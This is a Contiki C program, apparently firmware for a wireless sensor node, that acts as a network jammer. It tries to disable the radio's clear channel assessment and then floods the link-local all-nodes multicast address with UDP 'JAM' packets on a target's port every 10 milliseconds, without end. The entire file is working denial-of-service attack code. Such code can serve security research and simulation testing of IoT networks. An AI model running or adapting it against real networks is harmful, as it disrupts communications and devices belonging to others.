#include "contiki.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uiplib.h"
#include "net/ipv6/uip-ds6.h"
#include <stdint.h>
#include <string.h>
#include "sys/log.h"

#define LOG_MODULE "Jammer"
#define LOG_LEVEL LOG_LEVEL_INFO

#define UDP_PORT 8765
#define JAMMER_SEND_INTERVAL (CLOCK_SECOND / 100)  // Send a packet every 10ms

static struct simple_udp_connection jammer_udp_conn;
static struct etimer jammer_periodic_timer;

/*---------------------------------------------------------------------------*/
PROCESS(jammer_process, "Jammer Process");
AUTOSTART_PROCESSES(&jammer_process);
/*---------------------------------------------------------------------------*/
static void jammer_send_packet(void) {
  uip_ipaddr_t dest_ipaddr;
  static char jam_msg[] = "JAM";

  // Create a broadcast address
  uip_create_linklocal_allnodes_mcast(&dest_ipaddr);

  // Send the jam message to all nodes
  simple_udp_sendto(&jammer_udp_conn, jam_msg, sizeof(jam_msg), &dest_ipaddr);
  // LOG_INFO("Jamming packet sent\n");
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(jammer_process, ev, data) {
  PROCESS_BEGIN();

  // Disable CCA
  if (NETSTACK_RADIO.set_value(RADIO_PARAM_TX_MODE, 0) != RADIO_RESULT_OK) {
    LOG_ERR("Failed to disable CCA\n");
  } else {
    LOG_INFO("CCA disabled\n");
  }

  // Initialize UDP connection on the same port as the target
  simple_udp_register(&jammer_udp_conn, UDP_PORT, NULL, UDP_PORT, NULL);

  // Set a timer to send packets periodically
  etimer_set(&jammer_periodic_timer, JAMMER_SEND_INTERVAL);

  while (1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&jammer_periodic_timer));
    jammer_send_packet();
    etimer_reset(&jammer_periodic_timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
